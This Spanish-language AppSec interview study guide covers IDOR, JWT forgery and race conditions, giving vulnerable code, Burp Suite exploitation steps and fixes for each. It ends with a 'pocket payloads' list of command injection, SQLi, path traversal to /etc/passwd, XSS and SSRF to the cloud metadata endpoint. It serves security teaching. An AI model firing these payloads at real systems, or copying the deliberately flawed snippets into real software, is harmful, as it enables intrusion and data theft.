Si ves `memcpy(dst, src, user_len)` donde `dst` mide 64 bytes y `user_len` viene de la red, ¿que preguntas tecnicas haria un reviewer antes de concluir severidad e impacto?

## Modulo 7: Logica de negocio

### Vulnerabilidad: IDOR

#### 1. Concepto

IDOR aparece cuando el objeto se identifica con un valor manipulable y el backend no verifica autorizacion por objeto. La autenticacion existe, pero la autorizacion fina falla.

#### 2. Revision de Codigo Vulnerable

```python
01 @app.get("/invoice/<int:invoice_id>")
02 def invoice(invoice_id):
03     if "user_id" not in session:
04         return "auth required", 401
05     row = db.execute("SELECT id, owner_id, total FROM invoices WHERE id = ?", (invoice_id,)).fetchone()
06     if not row:
07         return "not found", 404
08     return dict(row)
```

Fallo exacto:

- Linea 05: se busca la factura por `id`, pero no se comprueba que `owner_id == session["user_id"]`.

#### 3. Explotacion (Burp Suite)

1. Intercepta una peticion legitima `/invoice/1001`.
2. En Repeater cambia el identificador a `1002`, `1003`, etc.
3. Si los IDs son UUID, prueba valores tomados de otras respuestas, HTML o APIs.
4. Usa Intruder con una lista secuencial o de identificadores observados.
5. Evalua diferencias en codigo de estado, longitud y contenido.

#### 4. Remediacion

```python
01 @app.get("/invoice/<int:invoice_id>")
02 def invoice(invoice_id):
03     if "user_id" not in session:
04         return "auth required", 401
05     row = db.execute(
06         "SELECT id, owner_id, total FROM invoices WHERE id = ? AND owner_id = ?",
07         (invoice_id, session["user_id"]),
08     ).fetchone()
09     if not row:
10         return "not found", 404
11     return dict(row)
```

#### 5. Ejercicio Practico

¿Por que cambiar IDs numericos por UUID no elimina por si mismo un IDOR?

### Vulnerabilidad: Manipulacion de JWT

#### 1. Concepto

El problema no es usar JWT sino validarlo mal: aceptar `alg:none`, no verificar firma, aceptar secretos debiles, no validar `aud`, `iss`, `exp` o confiar en claims para autorizacion sin controles extra.

#### 2. Revision de Codigo Vulnerable

```javascript
01 app.get('/admin', (req, res) => {
02   const token = (req.headers.authorization || '').replace('Bearer ', '');
03   const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
04   if (payload.role === 'admin') {
05     return res.send('panel');
06   }
07   return res.status(403).send('forbidden');
08 });
```

Fallo exacto:

- Linea 03: se decodifica el JWT pero nunca se verifica la firma.
- Linea 04: se confia en un claim manipulable por el cliente.

#### 3. Explotacion (Burp Suite)

1. Captura una request autentica con `Authorization: Bearer ...`.
2. En Decoder separa header, payload y firma.
3. Modifica el payload para poner `"role":"admin"`.
4. Re-encodea header y payload en base64url.
5. Deja la firma vacia o conserva cualquier valor, segun el parser vulnerable.
6. Reenvia desde Repeater y comprueba acceso.
7. Si la app si verifica firma pero usa secreto debil, evalua offline el impacto; en entrevista basta explicar el vector.

#### 4. Remediacion

```javascript
01 const jwt = require('jsonwebtoken');
02 
03 app.get('/admin', (req, res) => {
04   const token = (req.headers.authorization || '').replace('Bearer ', '');
05   try {
06     const payload = jwt.verify(token, process.env.JWT_PUBLIC_OR_SECRET, {
07       algorithms: ['HS256'],
08       issuer: 'study-guide',
09       audience: 'web',
10     });
11     if (payload.role !== 'admin') {
12       return res.status(403).send('forbidden');
13     }
14     return res.send('panel');
15   } catch {
16     return res.status(401).send('invalid token');
17   }
18 });
```

#### 5. Ejercicio Practico

Si el backend verifica firma pero toma `user_id` y `role` directamente del JWT para todo, ¿que revisarias en el flujo de autorizacion?

### Vulnerabilidad: Race Conditions

#### 1. Concepto

Una race condition aparece cuando dos o mas solicitudes concurrentes explotan una ventana temporal entre validacion y actualizacion. Casos tipicos: doble gasto, uso multiple de cupones, retiros duplicados y reservas inconsistentes.

#### 2. Revision de Codigo Vulnerable

```python
01 @app.post("/redeem")
02 def redeem():
03     coupon = db.execute("SELECT id, used FROM coupons WHERE code = ?", (request.form["code"],)).fetchone()
04     if not coupon or coupon["used"]:
05         return "invalid", 400
06     db.execute("UPDATE balances SET credit = credit + 100 WHERE user_id = ?", (session["user_id"],))
07     db.execute("UPDATE coupons SET used = 1 WHERE id = ?", (coupon["id"],))
08     db.commit()
09     return "ok"
```

Fallo exacto:

- Lineas 03 a 07: check y uso separados sin bloqueo ni transaccion atomica.

#### 3. Explotacion (Burp Suite)

1. Captura la peticion de canje.
2. Envia a Repeater y duplica la pestaña, o usa Intruder con recursos concurrentes si tu edicion lo permite.
3. Lanza multiples requests casi simultaneas con el mismo cupon.
4. Observa si mas de una devuelve `ok` o si el saldo aumenta varias veces.
5. Si el endpoint requiere CSRF token unico, primero analiza si el token es reutilizable.

#### 4. Remediacion

```python
01 @app.post("/redeem")
02 def redeem():
03     code = request.form["code"]
04     with db:
05         updated = db.execute(
06             "UPDATE coupons SET used = 1 WHERE code = ? AND used = 0",
07             (code,),
08         )
09         if updated.rowcount != 1:
10             return "invalid", 400
11         db.execute("UPDATE balances SET credit = credit + 100 WHERE user_id = ?", (session["user_id"],))
12     return "ok"
```

#### 5. Ejercicio Practico

Diseña mentalmente una prueba en Burp para un endpoint de transferencia bancaria donde sospechas TOCTOU entre balance check y debit.

## Vulnerabilidades extra que vale la pena repasar

### XXE

- Concepto: parseo XML con entidades externas habilitadas.
- SAST: busca `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory` sin hardening.
- DAST: prueba lectura de archivos locales o SSRF via entidad externa.

### Open Redirect

- Concepto: redirecciones basadas en URL controlada por usuario.
- Riesgo: phishing, robo de tokens, bypass parcial de allowlists.

### Sensitive Data Exposure

- Busca secretos hardcodeados, logs sensibles, passwords sin hash, tokens en URL.

### SSTI

- Busca `render_template_string`, `eval`, motores de plantillas inseguros o helper de debug.

## Patrones de respuesta en entrevista

- Empieza por el flujo: entrada, transformacion, sink, impacto.
- Explica por que la validacion actual falla.
- Propone remediacion concreta y verificable.
- Añade como lo confirmarias dinamicamente con Burp.
- Menciona riesgos de falsos positivos y condiciones de explotabilidad.

## Payloads de bolsillo para Burp Suite

- Command Injection: `;id`, `&&whoami`, `%0asleep 5`, `$(id)`
- SQLi: `' OR 1=1-- -`, `' UNION SELECT NULL,NULL-- -`
- NoSQLi: `{"$ne":null}`, `{"$regex":".*"}`
- Traversal: `../../../../etc/passwd`, `..%2f..%2f`
- XSS: `<svg/onload=alert(1)>`, `"><img src=x onerror=alert(1)>`
- SSRF: `http://127.0.0.1:8080`, `http://169.254.169.254/`
- JWT: modificar payload y observar validacion real

## Senales SAST por lenguaje

### Bash

- `eval`, `bash -c`, `source`, backticks, variables en comandos.

### Go

- `exec.Command("sh", "-c", ...)`, `os.ReadFile` con rutas de usuario, `http.Get(userURL)`.

### PHP

- `shell_exec`, `include($_GET...)`, `mysqli_query("...$x...")`, `unserialize`.

### Python

- `pickle.loads`, `subprocess(..., shell=True)`, SQL en f-strings, `render_template_string`.

### Java

- `Runtime.exec`, `ProcessBuilder` con shell, `Statement`, `readObject`, `Files.readAllBytes(resolve(userInput))`.

### JavaScript / Node.js

- `res.send` con interpolacion HTML, `child_process.exec`, `jwt.decode` sin `verify`.

### C

- `strcpy`, `strcat`, `sprintf`, `memcpy` con longitudes externas, punteros dangling.

## Cierre

Tu ventaja en una entrevista AppSec no viene de memorizar payloads, sino de detectar patrones repetibles: dato controlado, sink peligroso, validacion insuficiente y forma de demostrar impacto. Si puedes explicar el hallazgo de forma precisa, explotarlo con Burp y corregirlo con codigo seguro, estaras muy por encima del promedio.

## Recursos complementarios del proyecto

- Ejercicios SAST resueltos: `ejercicios_sast/soluciones/ejercicios_resueltos.md`
- Snippets por lenguaje: `ejercicios_sast/snippets/`
- Laboratorios Docker: `ejercicios_docker/`
